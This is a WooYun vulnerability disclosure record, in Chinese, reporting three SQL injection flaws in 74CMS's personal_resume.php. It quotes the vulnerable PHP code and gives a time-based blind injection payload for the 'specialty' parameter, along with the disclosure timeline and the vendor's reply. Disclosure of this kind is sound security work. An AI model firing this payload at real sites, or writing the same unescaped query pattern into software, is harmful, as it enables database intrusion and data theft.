{"id": 2018, "wybug_id": "wooyun-2014-061465", "wybug_title": "74CMS最新版SQL注入（同一文件多处）", "wybug_corp": "74c,s.com", "wybug_author": "路人甲", "wybug_date": "2014-05-19 17:53", "wybug_open_date": "2014-08-17 17:54", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "字符类型注射", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-23：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-17：\t细节向公众公开  简要描述： 74CMS最新版SQL注入（同一文件多处） 详细说明：  user/personal/personal_resume.php文件：第一处SQL注入：\n//创建简历 -保存基本信息elseif ($act=='make1_save'){\t$captcha=get_cache('captcha');\t$postcaptcha = trim($_POST['postcaptcha']);\tif($captcha['verify_resume']=='1' && empty($postcaptcha) && intval($_REQUEST['pid'])===0)\t{\t\tshowmsg(\"请填写验证码\",1); \t}\tif ($captcha['verify_resume']=='1' && intval($_REQUEST['pid'])===0 &&  strcasecmp($_SESSION['imageCaptcha_content'],$postcaptcha)!=0)\t{\t\tshowmsg(\"验证码错误\",1);\t}\t$setsqlarr['uid']=intval($_SESSION['uid']);\t$setsqlarr['title']=trim($_POST['title'])?trim($_POST['title']):showmsg('请填写简历名称！',1);\t$setsqlarr['fullname']=trim($_POST['fullname'])?trim($_POST['fullname']):showmsg('请填写姓名！',1);\t$setsqlarr['sex']=trim($_POST['sex'])?intval($_POST['sex']):showmsg('请选择性别！',1);\t$setsqlarr['sex_cn']=trim($_POST['sex_cn']);\t$setsqlarr['birthdate']=intval($_POST['birthdate'])>1945?intval($_POST['birthdate']):showmsg('请正确填写出生年份',1);\t$setsqlarr['height']=intval($_POST['height']);\t$setsqlarr['marriage']=intval($_POST['marriage']);\t$setsqlarr['marriage_cn']=trim($_POST['marriage_cn']);\t$setsqlarr['experience']=intval($_POST['experience']);\t$setsqlarr['experience_cn']=trim($_POST['experience_cn']);\t$setsqlarr['householdaddress']=trim($_POST['householdaddress'])?trim($_POST['householdaddress']):showmsg('请填写户口所在地！',1);\t\t$setsqlarr['education']=intval($_POST['education']);\t$setsqlarr['education_cn']=trim($_POST['education_cn']);\t$setsqlarr['tag']=trim($_POST['tag']);\t$setsqlarr['telephone']=trim($_POST['telephone'])?trim($_POST['telephone']):showmsg('请填写联系电话！',1);\t$setsqlarr['email']=$user['email'];\t$setsqlarr['email_notify']=$_POST['email_notify']==\"1\"?1:0;\t$setsqlarr['address']=trim($_POST['address'])?trim($_POST['address']):showmsg('请填写通讯地址！',1);\t$setsqlarr['website']=trim($_POST['website']);\t$setsqlarr['qq']=trim($_POST['qq']);\t$setsqlarr['refreshtime']=$timestamp;\t$setsqlarr['subsite_id']=intval($_CFG['subsite_id']);\t$setsqlarr['display_name']=intval($_CFG['resume_privacy']);\t\tif (intval($_REQUEST['pid'])===0)\t{\t\t\t\t$setsqlarr['audit']=intval($_CFG['audit_resume']);\t\t\t$total[0]=$db->get_total(\"SELECT COUNT(*) AS num FROM \".table('resume').\" WHERE uid='{$_SESSION['uid']}'\");\t\t\t$total[1]=$db->get_total(\"SELECT COUNT(*) AS num FROM \".table('resume_tmp').\" WHERE uid='{$_SESSION['uid']}'\");\t\t\t$total[2]=$total[0]+$total[1];\t\t\tif ($total[2]>=intval($_CFG['resume_max']))\t\t\t{\t\t\tshowmsg(\"您最多可以创建{$_CFG['resume_max']} 份简历,已经超出了最大限制！\",1);\t\t\t}\t\t\telse\t\t\t{\t\t\t$setsqlarr['addtime']=$timestamp;\t\t\t$pid=inserttable(table('resume'),$setsqlarr,1);\t\t\tif (empty($pid))showmsg(\"保存失败！\",0);\t\t\tcheck_resume($_SESSION['uid'],$pid);\t\t\twrite_memberslog($_SESSION['uid'],2,1101,$_SESSION['username'],\"创建了简历\");\t\t\theader(\"Location: ?act=make2&pid=\".$pid);\t\t\t}\t}\nfullname存在注入\n\n第二处SQL注入：\nelseif ($act=='make3_save'){\t\tif (intval($_POST['pid'])==0 ) showmsg('参数错误！',1);\t$setsqlarrspecialty['specialty']=!empty($_POST['specialty'])?$_POST['specialty']:showmsg('请填写您的技能特长！',1);\t$_CFG['audit_edit_resume']!=\"-1\"?$setsqlarrspecialty['audit']=intval($_CFG['audit_edit_resume']):\"\";\tupdatetable(table('resume'),$setsqlarrspecialty,\" id='\".intval($_POST['pid']).\"' AND uid='\".intval($_SESSION['uid']).\"'\");\tupdatetable(table('resume_tmp'),$setsqlarrspecialty,\" id='\".intval($_POST['pid']).\"' AND uid='\".intval($_SESSION['uid']).\"'\");\tcheck_resume($_SESSION['uid'],intval($_REQUEST['pid']));\tif ($_POST['go_resume_show'])\t{\t\theader(\"Location: ?act=resume_show&pid={$_POST['pid']}\");\t}\telse\t{\t\theader(\"Location: ?act=make4&pid=\".intval($_POST['pid']));\t}}\nspecialty存在SQL注入\n\n第三处SQL注入\n//创建简历-保存教育经历elseif ($act=='make4_save'){\t$resume_education=get_resume_education($_SESSION['uid'],$_REQUEST['pid']);\tif (count($resume_education)>=6) showmsg('教育经历不能超过6条！',1,$link);\t$setsqlarr['uid']=intval($_SESSION['uid']);\t$setsqlarr['pid']=intval($_REQUEST['pid']);\tif ($setsqlarr['uid']==0 || $setsqlarr['pid']==0 ) showmsg('参数错误！',1);\t$setsqlarr['start']=trim($_POST['start'])?$_POST['start']:showmsg('请填写开始时间！',1,$link);\t$setsqlarr['endtime']=trim($_POST['endtime'])?$_POST['endtime']:showmsg('请填写结束时间！',1,$link);\t$setsqlarr['school']=trim($_POST['school'])?$_POST['school']:showmsg('请填写学校名称！',1,$link);\t$setsqlarr['speciality']=trim($_POST['speciality'])?$_POST['speciality']:showmsg('请填写专业名称！',1,$link);\t$setsqlarr['education']=trim($_POST['education'])?$_POST['education']:showmsg('请选择获得学历！',1,$link);\t$setsqlarr['education_cn']=trim($_POST['education_cn'])?$_POST['education_cn']:showmsg('请选择获得学历！',1,$link);\t\tif (inserttable(table('resume_education'),$setsqlarr))\t\t{\t\t\tcheck_resume($_SESSION['uid'],intval($_REQUEST['pid']));\t\t\tif ($_POST['go_resume_show'])\t\t\t{\t\t\t\theader(\"Location: ?act=resume_show&pid={$setsqlarr['pid']}\");\t\t\t}\t\t\telse\t\t\t{\t\t\t$link[0]['text'] = \"继续添加教育经历\";\t\t\t$link[0]['href'] = '?act=make4&pid='.intval($_REQUEST['pid']);\t\t\t$link[1]['text'] = \"跳到下一步\";\t\t\t$link[1]['href'] = '?act=make5&pid='.intval($_REQUEST['pid']);\t\t\t$link[2]['text'] = \"查看我的教育经历\";\t\t\t$link[2]['href'] = '?act=make4&pid='.intval($_REQUEST['pid']);\t\t\tshowmsg(\"添加成功,您可以继续添加教育经历或跳到下一步 \",2,$link,true,15);\t\t\t}\t\t\t}\t\telse\t\t{\t\tshowmsg(\"保存失败！\",0,$link);\t\t}}\n参数speciality存在注入\n\n   漏洞证明：  以第二处SQL注入为例：\n链接：http://localhost/74cms/user/personal/personal_resume.php?act=make3_savePOST：specialty=123123123' WHERE uid='1' AND id='1' And if(mid(user(),1,1)='r',sleep(5),1)#&pid=1&go_resume_show=1\n当user()第一个字符为r时，延迟5秒。   修复方案：  过滤完整   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2014-05-20 15:08 厂商回复： 经检查并无大碍 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}